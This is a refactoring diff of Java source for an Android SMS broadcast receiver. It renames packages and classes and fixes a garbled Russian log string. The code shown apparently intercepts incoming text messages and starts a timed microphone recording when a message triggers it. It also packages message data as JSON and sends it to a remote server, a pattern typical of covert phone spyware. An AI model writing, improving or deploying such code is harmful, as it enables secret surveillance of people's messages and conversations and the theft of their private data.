@@ -1,4 +1,4 @@
-package com.inet.android.sms;
+package com.inet.android.message;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -14,7 +14,7 @@ import android.telephony.SmsMessage;
 
 import com.inet.android.audio.RecordAudio;
 import com.inet.android.request.ConstantValue;
-import com.inet.android.request.DataRequest;
+import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.ValueWork;
@@ -80,8 +80,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 										msgs[k].getMessageBody().length())) * 60;
 						Logging.doLog(LOG_TAG, "sec: " + minute, "sec: "
 								+ minute);
-						RecordAudio recordAudio = new RecordAudio(minute, 0, mContext);
-						recordAudio.executeRecording();
+						RecordAudio.executeRecording(minute, 0, mContext);
 					}
 
 				}
@@ -109,11 +108,10 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 					jsonObject.put("data", data);
 					sendJSONStr = object.toString();
 				} catch (JSONException e) {
-					Logging.doLog(LOG_TAG, "json СЃР»РѕРјР°Р»СЃСЏ", "json СЃР»РѕРјР°Р»СЃСЏ");
+					Logging.doLog(LOG_TAG, "json сломался", "json сломался");
 				}
 
-				DataRequest dr = new DataRequest(mContext);
-				dr.sendRequest(sendJSONStr);
+				RequestList.sendDataRequest(sendJSONStr, mContext);
 
 				Logging.doLog(LOG_TAG, sendJSONStr, sendJSONStr);
 
